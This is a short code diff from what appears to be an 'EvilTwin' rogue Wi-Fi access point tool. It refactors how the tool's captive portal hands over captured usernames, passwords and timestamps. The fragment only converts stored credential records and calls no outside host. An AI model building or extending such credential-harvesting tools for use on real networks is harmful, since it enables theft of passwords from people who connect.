@@ -367,8 +367,11 @@ const std::vector<ap::CapturedCredential>& EvilTwin::getCredentials() const {
     static std::vector<ap::CapturedCredential> convertedCreds;
     convertedCreds.clear();
     
-    const auto& arduinoCreds = arduinoPortal_.getCredentials();
-    for (const auto& cred : arduinoCreds) {
+    const ap::ArduinoCapturedCredential* arduinoCreds = arduinoPortal_.getCredentialsArray();
+    const size_t count = arduinoPortal_.getCredentialCount();
+    convertedCreds.reserve(count);
+    for (size_t i = 0; i < count; ++i) {
+        const auto& cred = arduinoCreds[i];
         ap::CapturedCredential converted;
         strncpy(converted.username, cred.username, sizeof(converted.username) - 1);
         strncpy(converted.password, cred.password, sizeof(converted.password) - 1);
@@ -376,7 +379,7 @@ const std::vector<ap::CapturedCredential>& EvilTwin::getCredentials() const {
         converted.timestamp = cred.timestamp;
         convertedCreds.push_back(converted);
     }
-    
+
     return convertedCreds;
 }
 
